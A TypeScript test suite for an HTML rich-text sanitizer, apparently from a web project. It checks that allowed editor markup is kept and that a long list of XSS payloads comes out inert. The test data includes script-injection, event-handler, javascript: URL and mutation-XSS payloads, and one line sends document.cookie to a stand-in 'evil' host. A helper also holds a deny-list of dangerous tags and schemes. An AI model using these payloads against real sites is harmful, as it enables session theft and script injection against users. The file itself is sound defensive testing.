import assert from "node:assert/strict";
import { describe, test } from "node:test";
import { sanitizeRichText } from "../src/index.ts";

/** Nothing executable or styleable may survive, whatever the payload. */
function assertInert(html: string) {
  const lower = html.toLowerCase();
  for (const needle of [
    "<script",
    "<iframe",
    "<img",
    "<svg",
    "<math",
    "<object",
    "<embed",
    "<form",
    "<input",
    "<button",
    "<style",
    "<link",
    "<meta",
    "<base",
    "<video",
    "<audio",
    "<source",
    "<template",
    "<noscript",
    "javascript:",
    "vbscript:",
    "data:",
    " on",
    "style=",
    "class=",
    "id=",
    "srcdoc",
    "formaction",
  ]) {
    assert.ok(!lower.includes(needle), `found "${needle}" in: ${html}`);
  }
}

describe("sanitizeRichText: keeps what the editor produces", () => {
  test("formatting, headings, lists, quotes, code and rules", () => {
    const html =
      "<h2>Title</h2><h3>Sub</h3><p><strong>b</strong> <em>i</em> <u>u</u> <s>s</s> <code>c</code><br />next</p>" +
      "<ul><li><p>one</p></li></ul><ol><li><p>two</p></li></ol>" +
      "<blockquote><p>quote</p></blockquote><pre><code>const a = 1;</code></pre><hr />";
    assert.equal(sanitizeRichText(html), html);
  });

  test("safe links keep href and get a fixed target and rel", () => {
    assert.equal(
      sanitizeRichText('<p><a href="https://example.com/a?b=1">x</a></p>'),
      '<p><a href="https://example.com/a?b=1" target="_blank" rel="noopener noreferrer nofollow">x</a></p>',
    );
    assert.equal(
      sanitizeRichText('<a href="mailto:me@example.com">mail</a>'),
      '<a href="mailto:me@example.com" target="_blank" rel="noopener noreferrer nofollow">mail</a>',
    );
  });

  test("b/i/h1/del are mapped to the allowed equivalents", () => {
    assert.equal(
      sanitizeRichText("<h1>T</h1><p><b>b</b><i>i</i><del>d</del></p>"),
      "<h2>T</h2><p><strong>b</strong><em>i</em><s>d</s></p>",
    );
  });

  test("Arabic text is kept", () => {
    assert.equal(sanitizeRichText("<p>مرحبا</p>"), "<p>مرحبا</p>");
  });
});

describe("sanitizeRichText: script injection", () => {
  const payloads = [
    "<script>alert(1)</script>",
    "<SCRIPT SRC=//evil.example/x.js></SCRIPT>",
    "<script type=module>import('//evil')</script>",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<<script>script>alert(1)<</script>/script>",
    "<script>/*</script><script>*/alert(1)</script>",
    '<p>ok</p><script>document.location="https://evil/?c="+document.cookie</script>',
  ];
  for (const payload of payloads) {
    test(payload, () => {
      const out = sanitizeRichText(payload);
      assertInert(out);
      assert.ok(!out.includes("alert(1)<") && !/<\s*script/i.test(out));
    });
  }

  test("script content is dropped, not shown as text", () => {
    assert.equal(sanitizeRichText("<p>a</p><script>alert(1)</script>"), "<p>a</p>");
  });
});

describe("sanitizeRichText: event handlers and attributes", () => {
  test("on* handlers are removed from allowed tags", () => {
    for (const payload of [
      '<p onclick="alert(1)">x</p>',
      '<p onmouseover=alert(1)>x</p>',
      '<p ONCLICK="alert(1)">x</p>',
      '<a href="https://ok.example" onfocus="alert(1)" autofocus>x</a>',
      '<strong onpointerenter="alert(1)">x</strong>',
    ]) {
      const out = sanitizeRichText(payload);
      assertInert(out);
      assert.ok(out.includes("x"));
    }
  });

  test("class, id, style, data-* and other attributes are removed", () => {
    assert.equal(
      sanitizeRichText(
        '<p class="evil" id="main" style="position:fixed;inset:0" data-x="1" title="t" dir="rtl" lang="ar" tabindex="0">x</p>',
      ),
      "<p>x</p>",
    );
    assert.equal(
      sanitizeRichText('<pre><code class="language-js">a</code></pre>'),
      "<pre><code>a</code></pre>",
    );
  });

  test("link attributes other than href are replaced, not merged", () => {
    const out = sanitizeRichText(
      '<a href="https://ok.example" target="_self" rel="opener" download ping="https://evil" class="c" id="i" style="color:red">x</a>',
    );
    assert.equal(
      out,
      '<a href="https://ok.example" target="_blank" rel="noopener noreferrer nofollow">x</a>',
    );
  });
});

describe("sanitizeRichText: dangerous tags", () => {
  const payloads: Array<[string, string]> = [
    ["iframe", '<iframe src="https://evil.example"></iframe>'],
    ["iframe srcdoc", '<iframe srcdoc="<script>alert(1)</script>"></iframe>'],
    ["img onerror", "<img src=x onerror=alert(1)>"],
    ["svg onload", "<svg onload=alert(1)><circle/></svg>"],
    ["svg script", "<svg><script>alert(1)</script></svg>"],
    ["math", '<math><mtext><a href="javascript:alert(1)">x</a></mtext></math>'],
    ["object", '<object data="javascript:alert(1)"></object>'],
    ["embed", '<embed src="javascript:alert(1)">'],
    ["form", '<form action="https://evil"><input name="p"><button formaction="javascript:alert(1)">go</button></form>'],
    ["style", "<style>body{display:none}</style><p>x</p>"],
    ["link", '<link rel="stylesheet" href="https://evil/x.css">'],
    ["meta refresh", '<meta http-equiv="refresh" content="0;url=https://evil">'],
    ["base", '<base href="https://evil/">'],
    ["video", "<video><source onerror=alert(1)></video>"],
    ["audio", "<audio src=x onerror=alert(1)></audio>"],
    ["template", "<template><script>alert(1)</script></template>"],
    ["details ontoggle", "<details open ontoggle=alert(1)><summary>x</summary></details>"],
    ["marquee", "<marquee onstart=alert(1)>x</marquee>"],
    ["body onload", "<body onload=alert(1)>x</body>"],
    ["html comment", "<!--<script>alert(1)</script>--><p>x</p>"],
    ["conditional comment", "<!--[if IE]><script>alert(1)</script><![endif]-->"],
    ["cdata", "<![CDATA[<script>alert(1)</script>]]>"],
    [
      "noscript mXSS",
      '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>',
    ],
    ["textarea breakout", "<textarea></textarea><img src=x onerror=alert(1)>"],
    ["select/option", "<select><option><img src=x onerror=alert(1)></option></select>"],
  ];
  for (const [name, payload] of payloads) {
    test(name, () => assertInert(sanitizeRichText(payload)));
  }

  test("iframe content is dropped entirely", () => {
    assert.equal(sanitizeRichText("<p>a</p><iframe>inner</iframe>"), "<p>a</p>");
  });

  test("unknown tags lose their markup but keep their text", () => {
    assert.equal(sanitizeRichText("<p><span class='x'>hi</span> <font color='red'>there</font></p>"), "<p>hi there</p>");
  });
});
